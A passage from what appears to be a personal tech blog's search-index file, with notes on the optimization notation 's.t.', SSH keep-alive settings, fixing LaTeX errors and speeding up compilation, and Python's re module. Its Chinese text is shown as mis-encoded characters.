id="s.t.">s.t.</h2><p>åœ¨ä¼˜åŒ–é—®é¢˜çš„æ±‚è§£ä¸­ï¼Œå¦‚çº¿æ€§è§„åˆ’ã€éçº¿æ€§è§„åˆ’é—®é¢˜ç­‰ï¼Œç»å¸¸ä¼šé‡åˆ°æ•°å­¦ç¬¦å·â€œs.t.â€ï¼Œå®ƒçš„æ„æ€æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>â€œs.t.â€ï¼ŒæŒ‡ subject toï¼Œå—é™åˆ¶äº...ã€‚</p><p>ä¾‹å¦‚ï¼š ç›®æ ‡å‡½æ•°ï¼šmin {x+2} çº¦æŸæ¡ä»¶ï¼šs.t. x={1,2,3}</p><p>å…¶é¢˜æ„ä¸ºï¼Œæ±‚ x+2 çš„æœ€å°å€¼ä»¥ä½¿å¾— x çš„å–å€¼ä¸º 1ã€2ã€3 æ—¶ã€‚ æˆ–è€…ç†è§£ä¸ºï¼Œxçš„å–å€¼ä¸º 1ã€2ã€3 æ—¶ï¼Œæ±‚ x+2 çš„æœ€å°å€¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Keep SSH alive when no operation for a period of time</title>
      <link href="/blog/2023/02/16/linux/git/keep_ssh_alive/"/>
      <url>/blog/2023/02/16/linux/git/keep_ssh_alive/</url>
      
        <content type="html"><![CDATA[<h2 id="ssh-è¿œç¨‹é•¿æ—¶é—´ä¸æ“ä½œå°±æ–­å¼€">ssh è¿œç¨‹é•¿æ—¶é—´ä¸æ“ä½œå°±æ–­å¼€</h2><p>æœ€è¿‘åœ¨è¿œç¨‹ä½¿ç”¨ jupyter notebook, ä½†æ˜¯ vscode remoteæ—¶é—´ä¸€é•¿å°±ä¼šæ–­å¼€,å¯¼è‡´ notebookçš„è¾“å‡ºæ’ç‰ˆä¹±æˆ–è€…ç”šè‡³è¿æ¥æ–­å¼€,å› æ­¤æ‰¾åˆ°å¦‚ä¸‹ä¸¤ç§æ–¹æ³•,ä¸€èµ·ä½¿ç”¨åå‡ ä¹æ²¡æœ‰æ–­å¼€è¿‡äº†.</p><h2 id="ä¸»æœºå®šæ—¶è¿æœåŠ¡å™¨">ä¸»æœºå®šæ—¶è¿æœåŠ¡å™¨</h2><p>åœ¨ä¸»æœºçš„ ssh é…ç½®ä¸­,è®¾ç½®å¦‚ä¸‹æ¥ä¿æŒè¿æ¥:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host SomeRemoteHost</span><br><span class="line">  HostName MyRemoteHostName</span><br><span class="line">  User MyUsername</span><br><span class="line">  ServerAliveInterval 60</span><br><span class="line">  ServerAliveCountMax 30</span><br></pre></td></tr></table></figure><p>æ³¨æ„:å¦‚æœä½ çš„ä¸»æœºè¿›å…¥ä¼‘çœ æ¨¡å¼,åˆ™ä¸èµ·æ•ˆæœ.ä½†æ˜¯å½“ä½ å¹²åˆ«çš„äº‹æƒ…æ—¶,å®ƒå¯ä»¥åœ¨åå°ä¿æŒè¿æ¥</p><h2 id="è®©æœåŠ¡å™¨å®šæ—¶å›è¿ä¸»æœº">è®©æœåŠ¡å™¨å®šæ—¶å›è¿ä¸»æœº</h2><p>ç¼–è¾‘ <code>sshd_config</code>Â  é…ç½®æ–‡ä»¶<code>sudo vim /etc/ssh/sshd_config</code></p><p>åœ¨å…¶ä¸­æ‰¾åˆ°ä»¥ä¸‹é…ç½®é¡¹ç›®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br></pre></td></tr></table></figure><p>å»é™¤æ³¨é‡Šå¹¶ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClientAliveInterval 60</span><br><span class="line">ClientAliveCountMax 3</span><br></pre></td></tr></table></figure><p><code>ClientAliveInterval</code>Â æŒ‡å®šäº†æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯çš„æ—¶é—´é—´éš”, é»˜è®¤æ˜¯ Â <code>0</code>Â ,ä¸å‘é€. è€Œ Â <code>ClientAliveInterval 60</code>Â  è¡¨ç¤ºæ¯åˆ†é’Ÿå‘é€ä¸€æ¬¡,ç„¶åå®¢æˆ·ç«¯å“åº”, è¿™æ ·å°±ä¿æŒé•¿è¿æ¥äº†.</p><p><code>ClientAliveCountMax</code>Â , ä½¿ç”¨é»˜è®¤å€¼ Â <code>3</code>Â å³å¯.Â <code>ClientAliveCountMax</code>Â è¡¨ç¤ºæœåŠ¡å™¨å‘å‡ºè¯·æ±‚åå®¢æˆ·ç«¯æ²¡æœ‰å“åº”çš„æ¬¡æ•°è¾¾åˆ°ä¸€å®šå€¼, å°±è‡ªåŠ¨æ–­å¼€.æ­£å¸¸æƒ…å†µä¸‹, å®¢æˆ·ç«¯ä¸ä¼šä¸å“åº”.</p><p>macOS é‡å¯ Â <code>sshd service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist</span><br><span class="line">sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl stop com.openssh.sshd</span><br><span class="line">sudo launchctl start com.openssh.sshd</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><p><ahref="https://tszv.vercel.app/pages/94a7fe/#%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5">Macä½¿ç”¨ VS Code é…åˆ Remote Development æ’ä»¶è¿æ¥ Windows è¿œç¨‹æœåŠ¡å™¨ |Henry</a></p></li><li><p><ahref="https://stackoverflow.com/questions/60714159/is-there-a-way-to-reconnect-to-a-disconnected-vs-code-remote-ssh-connection">Isthere a way to reconnect to a disconnected VS Code Remote SSHconnection? - Stack Overflow</a></p></li><li><p><ahref="https://stackoverflow.com/questions/45107901/running-jupyter-notebook-in-the-background-on-remote-server-get-output">ssh- Running Jupyter Notebook in the background on remote server, getoutput - Stack Overflow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX æŠ¥é”™é—®é¢˜æ±‡æ€»</title>
      <link href="/blog/2023/02/16/misc/latex/latex_errs/"/>
      <url>/blog/2023/02/16/misc/latex/latex_errs/</url>
      
        <content type="html"><![CDATA[<h1 id="vscode-latex-ç¼–è¯‘æŠ¥é”™é—®é¢˜æ±‡æ€»">VSCode Latexç¼–è¯‘æŠ¥é”™é—®é¢˜æ±‡æ€»</h1><ol type="1"><li><p>ä½¿ç”¨ pdflatex å››æ­¥ç¼–è¯‘ï¼Œä¸‹è½½çš„ IEEEæœŸåˆŠæ¨¡ç‰ˆï¼ŒæŠ¥é”™ï¼š<code>I found no \bibdata command</code></p><p>åŸå› æ˜¯è¯¥ receipe ä½¿ç”¨äº† bibtex å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼šéœ€è¦ bibå¼•ç”¨ä½œä¸ºè¾“å…¥ï¼Œå› æ­¤è§£å†³æ–¹æ³•å°±æ˜¯åœ¨.tex æ–‡ä»¶çš„\end{document}å‰é¢åŠ ä¸¤å¥</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\bibliographystyle&#123;IEEEtran&#125;</span><br><span class="line">\bibliography&#123;refs.bib&#125;</span><br></pre></td></tr></table></figure></p><p>ç„¶ååˆ›å»º refs.bib, çœ‹å¯å¦ï¼Œä¸è¡Œçš„è¯ï¼Œå¼•ç”¨ä¸€ä¸ªæ–‡çŒ®ï¼Œå°±å¯ä»¥äº†</p></li><li><p>pdflatex å’Œ xelatex åŒºåˆ«</p><p>åŒºåˆ«æ¯”è¾ƒå¤šï¼ŒåŸºæœ¬è¯­è¨€åŒºåˆ«ä¸å¤§ã€‚æ¯”å¦‚å­—ä½“æ–¹é¢ï¼ŒXeLaTeXæ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå­—ä½“çš„ï¼Œå¤šè¯­è¨€çš„åœºæ™¯ï¼Œxelatexä½¿ç”¨æ¯”è¾ƒæ–¹ä¾¿ï¼ŒPDFLaTeX æ˜¯ä¸è¡Œçš„ã€‚è‹±æ–‡åœºæ™¯ pdflatex è¶³å¤Ÿç”¨äº†ã€‚</p></li><li><p>vscode latex ä¸­ sort bibçš„åŠŸèƒ½,æŒ‰ç…§ä½œè€…å¹´ä»½ç­‰æ’åº,å¹¶å¯é…ç½®æ˜¯å¦å»é‡ç­‰,ä½†æ˜¯ä¸€èˆ¬ç”¨ä¸åˆ°.</p></li><li><p>latex ç¼–è¯‘æŠ¥é”™</p><ol type="1"><li>æ€æ‰ vscode è¿›ç¨‹ï¼Œé‡å¯ vscode</li><li>åˆ é™¤è¾…åŠ©æ–‡ä»¶ï¼Œé‡æ–°ç¼–è¯‘</li><li>æ£€æŸ¥ begin end {} é…å¯¹æ•°ç›®</li><li>æ£€æŸ¥å…¬å¼çš„ <code>_</code> æ˜¯å¦è½¬ä¹‰</li><li>æ¢ overleaf ç¼–è¯‘ä¸€ä¸‹è¯•è¯•</li></ol></li></ol><h2 id="latex-æŠ¥é”™å®¹æ˜“æ‰¾ä¸åˆ°çš„åœ°æ–¹">LaTeX æŠ¥é”™å®¹æ˜“æ‰¾ä¸åˆ°çš„åœ°æ–¹</h2><ol type="1"><li>ä½œè€…é‚®ç®±ä¸­å«æœ‰ <code>_</code> ç­‰éœ€è¦åæ–œæ è½¬ä¹‰çš„ç¬¦å·</li><li>ä½œè€…çš„ bio ä¸­å«æœ‰ <code>&amp;</code> ç­‰éœ€è¦åæ–œæ è½¬ä¹‰çš„ç¬¦å·</li></ol><h1 id="latex-no-endif-endfor">Latex no endif endfor</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[noend]&#123;algorithmic&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªä»£ç  <code>_</code> è¦å†™æˆ<code>\_</code> è½¬ä¹‰</p><h2 id="underfull-hbox-badness-10000-in-paragraph-at-lines">Underfullhbox (badness 10000) in paragraph at lines</h2><p>Underfull æ˜¯è¯´è¯¥å¤„æ’ç‰ˆå†…å®¹å¤ªç¨€ç–äº†ï¼ˆbadness 10000) æ˜¯ TeXè¡¡é‡æ’ç‰ˆæ•ˆæœä¸å¥½çš„ä¸€ä¸ªå°ºåº¦ï¼›å¯ä»¥é€šè¿‡ä½¿ç”¨ç©ºæ ¼ç¬¦å’Œæ¢è¡Œç¬¦æ¥è¿›è¡Œå¤„ç†ã€‚</p><p>Overfull æ˜¯è¯´è¯¥å¤„å†…å®¹å¤ªå¤šï¼Œè¶…å‡ºäº†è®¾å®šçš„å°åˆ·èŒƒå›´ 49.88315ç‚¹ã€‚è¿™å¤šæ•°æ˜¯ç”±äºç³»ç»Ÿæ— æ³•æ‰¾åˆ°åˆé€‚çš„è‡ªåŠ¨æ¢è¡Œç‚¹é€ æˆçš„ã€‚</p><p>ä¸è¿‡è¿™ä¸¤ä¸ªè­¦å‘Šéƒ½ä¸å½±å“å®é™…æ˜¾ç¤ºï¼Œè‹¥å«Œéº»çƒ¦ï¼Œä¸å¤„ç†ä¹Ÿæ²¡äº‹ã€‚é€ æˆunderfull çš„åŸå› æœ‰å¾ˆå¤šï¼Œæœ€å¸¸è§æ˜¯åœ¨ä¸è¯¥ä½¿ç”¨ <code>\\</code> çš„åœ°æ–¹ä½¿ç”¨äº†<code>\\</code>.</p><h2 id="supplementary">supplementary</h2><p>supplementaryä½¿ç”¨çš„åŒ…å»ºè®®ç›´æ¥ä»ä¸»æ–‡ä»¶<strong>å®Œå…¨</strong>å¤åˆ¶è¿‡æ¥ï¼Œç„¶ååŠ ä¸Šä»¥ä¸‹ä¸¤è¡Œï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;xr&#125;</span><br><span class="line"><span class="keyword">\externaldocument</span>&#123;ä¸»æ–‡ä»¶åå­—&#125;</span><br><span class="line"><span class="keyword">\setcounter</span>&#123;equation&#125;&#123;è®¾ç½® supplementary çš„å…¬å¼èµ·å§‹ç¬¦å·&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸»æ–‡ä»¶ä½¿ç”¨äº† hyperref åŒ…æ¥ç‚¹å‡»è·³è½¬å’ŒåŠ  bookmarkï¼Œé‚£ supplementaryè¿˜éœ€è¦åŠ ä¸Šä»¥ä¸‹ä¸¤è¡Œï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>[breaklinks,colorlinks,linkcolor=black,citecolor=black,urlcolor=black]&#123;hyperref&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;xr-hyper&#125;</span><br></pre></td></tr></table></figure><p>æœ€è¿‘ä½¿ç”¨çš„æ—¶å€™å°±å› ä¸ºä¸»æ–‡ä»¶ä½¿ç”¨äº† hyperrefï¼Œç„¶å supplementaryæ²¡æœ‰åŠ ä¸Šè¿™ä¸¤è¡Œï¼Œå¯¼è‡´å¼•ç”¨ä¸»æ–‡ä»¶å…¬å¼çš„æ—¶å€™åç§°å¤šä¸€äº› sectionåå­—ï¼Œé€šè¿‡æŸ¥çœ‹ auxè¾…åŠ©æ–‡ä»¶ï¼Œæˆ‘æ–™æƒ³åº”è¯¥æ˜¯è¿™ä¸ªåŒ…çš„é—®é¢˜ï¼Œå°è¯•ä¹‹åç¡®å®çº æ­£äº†ã€‚</p><h2 id="supplementary-ä½¿ç”¨-appendices-å¤§ç‰‡ç©ºç™½">supplementary ä½¿ç”¨appendices å¤§ç‰‡ç©ºç™½</h2><p>å½“è¦æŠŠæ­£æ–‡ä¸­çš„è¯æ˜ç­‰æ¢åˆ° supplementaryä¸­æ—¶ï¼Œç”±äºå½“æ—¶å°†æ­£æ–‡çš„å…¬å¼éƒ½ä½¿ç”¨äº†ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œç©ºé—´å‹ç¼©ï¼Œå› æ­¤ latexçš„è‡ªåŠ¨è°ƒæ•´ä¸åˆé€‚äº†ã€‚å› æ­¤å»æ‰è¿™äº›å›ºå®šè·ç¦»çš„ä»£ç ï¼Œlatexè‡ªåŠ¨è°ƒæ•´å°±æ²¡æœ‰å¤§ç‰‡ç©ºç™½äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\setlength&#123;\abovedisplayskip&#125;&#123;1pt&#125;</span><br><span class="line">\setlength&#123;\belowdisplayskip&#125;&#123;1pt&#125;</span><br></pre></td></tr></table></figure><h2id="æˆ–-newline-å‰æ–¹éœ€è¦æœ‰é—®é¢˜å¦åˆ™æŠ¥é”™-latex-error-theres-no-line-here-to-end."><code>\\</code>æˆ– <code>\newline</code> å‰æ–¹éœ€è¦æœ‰é—®é¢˜ï¼Œå¦åˆ™æŠ¥é”™ LaTeX Error: There'sno line here to end.</h2><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://tex.stackexchange.com/questions/523527/edef-hytempb-cite-xrprefix-error-when-citing-same-bibtex-entry-in-exter">hyperref- {}\edef \Hy@tempb {cite.error when citing same bibtex entry in - TeX -LaTeX Stack Exchange</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX ç¼–è¯‘åŸç†ï¼Œå¦‚ä½•é™ä½ç¼–è¯‘æ—¶é—´</title>
      <link href="/blog/2023/02/16/misc/latex/latex_principles/"/>
      <url>/blog/2023/02/16/misc/latex/latex_principles/</url>
      
        <content type="html"><![CDATA[<p>LaTeX å‘éŸ³ï¼šlai tai ke si æˆ– la tai ke</p><h2 id="latex-å››æ­¥ç¼–è¯‘å¤§è‡´åŸç†">LaTeX å››æ­¥ç¼–è¯‘å¤§è‡´åŸç†</h2><p>æˆ‘ç”»äº†å¼ ç¼–è¯‘é“¾æ¥å›¾ï¼Œç®€æ´æ˜äº†ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/latex_complie.png"alt="latex_complie" /><figcaption aria-hidden="true">latex_complie</figcaption></figure><h2 id="å¦‚ä½•æ›´å¿«ç¼–è¯‘---ç¼–è¯‘æ•ˆç‡">å¦‚ä½•æ›´å¿«ç¼–è¯‘ - ç¼–è¯‘æ•ˆç‡</h2><ol type="1"><li><p>å–æ¶ˆå‹ç¼©,æœ€ç»ˆç‰ˆæœ¬å†å‹ç¼© [æš‚æœªæµ‹è¯•]</p><p>å–æ¶ˆ LaTeX ç¼–è¯‘å™¨å¯¹ PDF çš„å‹ç¼©, å–æ¶ˆå‹ç¼©åé€Ÿåº¦æå‡æ¥è¿‘ 3 å€, pdfå¤§å°å¢åŠ ä¹Ÿå¾ˆå¤§.</p><p>æ–¹æ³•æ˜¯åœ¨ tex æ–‡æ¡£å¼€å¤´åŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\special&#123;dvipdfmx:config z 0&#125; %å–æ¶ˆPDFå‹ç¼©ï¼ŒåŠ å¿«é€Ÿåº¦ï¼Œæœ€ç»ˆç‰ˆæœ¬ç”Ÿæˆçš„æ—¶å€™æœ€å¥½æŠŠè¿™å¥è¯æ³¨é‡Šæ‰</span><br></pre></td></tr></table></figure></p><p>æˆ–</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\pdfcompresslevel=0</span><br><span class="line">\pdfobjcompresslevel=0</span><br></pre></td></tr></table></figure></p></li><li><p>æ›´æ¢ç³»ç»Ÿ - Test Done</p><p>æå‡ LaTeX ç¼–è¯‘å™¨çš„ I/O æ•ˆç‡,ç”±äºè¯¥éƒ¨åˆ†å’Œæ“ä½œç³»ç»Ÿç›¸å…³ï¼Œå› æ­¤ä¹Ÿå°±æ˜¯å°†ç³»ç»Ÿæ¢æˆ Linux æˆ–è€… Macã€‚</p></li><li><p>ä½¿ç”¨ LaTeXmk ç¼–è¯‘ - Test Done</p><p>æ¨èä½¿ç”¨ latexmk ç¼–è¯‘ã€‚å› ä¸º latexmk ä¼šè‡ªåŠ¨æ£€æµ‹ç¼–è¯‘æ—¶éœ€è¦ä½¿ç”¨ LaTeXçš„æ¬¡æ•°ã€‚ï¼ˆæ¯”å¦‚ï¼Œå½“ä½ å°è¯•é‡å¤ç¼–è¯‘ä¸€ä¸ªæ–‡æ¡£æ—¶ï¼Œlatexmkä¼šè·³è¿‡æ‰€æœ‰å·²å®Œæˆçš„æ­¥éª¤ã€‚ï¼‰,å¹¶ä¸”ä¼šæ ¹æ®ä½  LaTeXæ–‡æ¡£çš„æ›´æ”¹ï¼Œå¢é‡ç¼–è¯‘ï¼Œä»è€ŒåŠ å¿«å¯¹åŸæ–‡æ¡£è¿›è¡Œå¾®å°å˜åŒ–åï¼ˆæ¯”å¦‚åªä¿®æ”¹ä¸€ä¸ªå­—ï¼‰çš„ç¼–è¯‘é€Ÿåº¦ã€‚è¿™ç›¸å¯¹äºå››æ­¥ç¼–è¯‘,æ¯æ¬¡éƒ½å…¨é‡ç¼–è¯‘å¿«å¤šäº†.</p><blockquote><p>åªæ”¹çº¯æ–‡å­—éƒ¨åˆ†,æ²¡æœ‰æ”¹åˆ«çš„,åº”è¯¥å¯ä»¥ç›´æ¥è¿è¡Œä¸€æ¬¡ LateXå‘½ä»¤æå®š?[æš‚æœªæµ‹è¯•]</p></blockquote></li><li><p><strong>[Recommend]draft æ¨¡å¼</strong> - Test Done</p><p>åœ¨æœ‰å¤§é‡å›¾ç‰‡çš„æƒ…å†µä¸‹,ç¼–è¯‘é€Ÿåº¦å˜æ…¢, å¯é‡‡ç”¨ draftæ¨¡å¼,æœ€ç»ˆç‰ˆå†å–æ¶ˆè¯¥æ¨¡å¼.</p><p>å¯¹ documentclass æˆ– graphicx åŠ ä¸€ä¸ª draft é€‰é¡¹:<code>\documentclass[draft]&#123;article&#125;</code> æˆ–<code>\usepackage[draft]&#123;graphicx&#125;</code></p><p>draft æ¨¡å¼ä¸‹,å¦‚æœå¸Œæœ›çœ‹æŸå¼ å›¾ç‰‡,å¯ä»¥å•ç‹¬å¯¹è¯¥å›¾ç‰‡å–æ¶ˆ draft æ¨¡å¼:<code>\includegraphics[draft=false]&#123;image.pdf&#125;</code></p></li><li><p>å›¾ç‰‡æ ¼å¼é€‰æ‹©</p><p>å°½é‡é€‰ç”¨ pdf æ ¼å¼,é€Ÿåº¦å¿«åˆæ¸…æ™°</p></li></ol><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://tex.stackexchange.com/questions/121383/how-does-the-latex-compile-chain-work-exactly">Howdoes the LaTeX compile chain work exactly?</a></li><li><ahref="https://bithesis.bitnp.net/Guide/4-Others/Troubleshooting.html#åˆ é™¤-minted-å®åŒ…çš„ç¼“å­˜æ–‡ä»¶å¤¹">LaTeXç–‘éš¾æ‚ç—‡</a></li><li><ahref="https://tex.stackexchange.com/questions/51893/turning-off-and-on-images-in-figures">Turningoff and on images in figures</a></li><li><ahref="https://www.overleaf.com/learn/how-to/Optimising_very_large_image_files">Optimisingvery large image files</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python re æ¨¡å—ä½¿ç”¨</title>
      <link href="/blog/2023/02/16/programming/python/re_usage/"/>
      <url>/blog/2023/02/16/programming/python/re_usage/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸¤ç§ä½¿ç”¨æ–¹å¼">ä¸¤ç§ä½¿ç”¨æ–¹å¼</h2><h3 id="ç›´æ¥ä½¿ç”¨-re-æ¨¡å—ç”Ÿæˆ-match-å¯¹è±¡">ç›´æ¥ä½¿ç”¨ re æ¨¡å—ç”Ÿæˆ Matchå¯¹è±¡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">hello 12 world</span></span><br><span class="line"><span class="string">Goodbye 224 world</span></span><br><span class="line"><span class="string">h yet anothet &#x27;h&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pattern = <span class="string">r&quot;\d&#123;1,&#125;&quot;</span></span><br><span class="line">match_obj = re.search(pattern, test)</span><br><span class="line"><span class="built_in">print</span>(match_obj)</span><br><span class="line"><span class="built_in">print</span>(match_obj.group())</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘-pattern-å¯¹è±¡ç„¶åç”¨å…¶ç”Ÿæˆ-match-å¯¹è±¡">ç¼–è¯‘ Patternå¯¹è±¡ï¼Œç„¶åç”¨å…¶ç”Ÿæˆ Match å¯¹è±¡</h3><p>å…ˆä½¿ç”¨ <code>re.complie</code> å°†æ¨¡å¼å­—ç¬¦ä¸²ç¼–è¯‘ä¸º patternå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ pattern å¯¹è±¡çš„ matchï¼Œ searchï¼Œ findallï¼Œ finditeræ–¹æ³•ï¼ˆå®ƒä»¬çš„å‚æ•°åªæ˜¯ç›¸å¯¹äº re è‡ªå¸¦çš„æ–¹æ³•å°‘äº†ä¸€ä¸ªæ¨¡å¼å­—ç¬¦ä¸²è€Œå·²ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">test = &quot;&quot;&quot;</span><br><span class="line">hello 12 world</span><br><span class="line">Goodbye 224 world</span><br><span class="line">h yet anothet &#x27;h&#x27;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pattern = r&quot;\d&#123;1,&#125;&quot;</span><br><span class="line">pattern_obj = re.compile(pattern)</span><br><span class="line">match_obj = pattern_obj.search(test)</span><br><span class="line">print(match_obj)</span><br><span class="line">print(match_obj.group())</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨">ä½¿ç”¨</h2><p>findall è¿”å›åˆ—è¡¨ ï¼Œåˆ—è¡¨ä¸èƒ½ groupï¼ˆï¼‰</p><p>æ³¨æ„ï¼šmatchï¼Œ searchç­‰åŒ¹é…åï¼Œéœ€è¦åˆ¤æ–­è¿”å›å¯¹è±¡æ˜¯å¦ä¸ºç©ºï¼Œç©ºå¯¹è±¡ä¸èƒ½æ‰§è¡Œ matchå¯¹è±¡çš„æ–¹æ³•ä»¬ï¼Œä¼šæŠ¥é”™ã€‚</p><h2 id="match-å¯¹è±¡çš„æ–¹æ³•">match å¯¹è±¡çš„æ–¹æ³•</h2><p><code>start()</code>ï¼šFind starting index position of a group<code>end()</code>: Find last index position of a group<code>group()</code>: Retrieve value of a group by number or name</p><h2 id="find-the-first-match">Find the first match</h2><p><code>match, search</code>, <code>search</code>:åªè¿”å›ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„åŒ¹é…</p><h2 id="find-all-matches">Find all Matches</h2><p>findall ä¸ finditer</p><p>findall: find all match in a single callè¿”å›åŒ¹é…åˆ—è¡¨ï¼Œç›´æ¥è¾“å‡ºå³å¯ã€‚</p><p>finditer: iterate through matches one by one è¿”å›è¿­ä»£å™¨ï¼Œé€šè¿‡ foré€ä¸ªå¾ªç¯è¿­ä»£ï¼Œå½“æˆ match å¯¹è±¡ä½¿ç”¨ã€‚</p><p>finditer ç”¨æ¥è§£å†³ findall ä¸¤ä¸ªç¼ºé™·ï¼š</p><ol type="1"><li>å¤§é‡æ•°æ®æœç´¢æ—¶é—´é•¿ï¼Œå­˜å‚¨çš„åˆ—è¡¨æ•°æ®è¿‡å¤§</li><li>ä¸çŸ¥é“æ¯ä¸ª match çš„ä½ç½®</li></ol><h2 id="find-and-match-text">Find and Match Text</h2><p>Python çš„ re æ¨¡å—æä¾›äº† re.sub ç”¨äºæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„åŒ¹é…é¡¹ã€‚</p><p>è¯­æ³•ï¼š</p><p>re.sub(pattern, repl, string, count=0, flags=0)</p><p>å‚æ•°ï¼š</p><ul><li>pattern : æ­£åˆ™ä¸­çš„æ¨¡å¼å­—ç¬¦ä¸²ã€‚</li><li>repl : æ›¿æ¢çš„çº¯å­—ç¬¦ä¸²(å¯ä»¥å¼•ç”¨åˆ†ç»„)ï¼Œä¹Ÿå¯ä¸ºä¸€ä¸ªå‡½æ•°ã€‚ Notice: å¹¶ä¸æ˜¯pattern æ¨¡å¼å­—ç¬¦ä¸²,åªæ˜¯å¯ä»¥å¼•ç”¨è€Œå·²., å…¶ä¸­ æ˜¯æŒ‡ groupï¼Œ åé¢è·Ÿ number æˆ–name.</li><li>string : è¦è¢«æŸ¥æ‰¾æ›¿æ¢çš„åŸå§‹å­—ç¬¦ä¸²ã€‚</li><li>count : æ¨¡å¼åŒ¹é…åæ›¿æ¢çš„æœ€å¤§æ¬¡æ•°ï¼Œé»˜è®¤ 0 è¡¨ç¤ºæ›¿æ¢æ‰€æœ‰çš„åŒ¹é…ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">substitution_example</span>():</span><br><span class="line">    pattern = <span class="string">r&quot;(?P&lt;value&gt;\d+(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?)\s+dollar(s)?&quot;</span></span><br><span class="line"></span><br><span class="line">    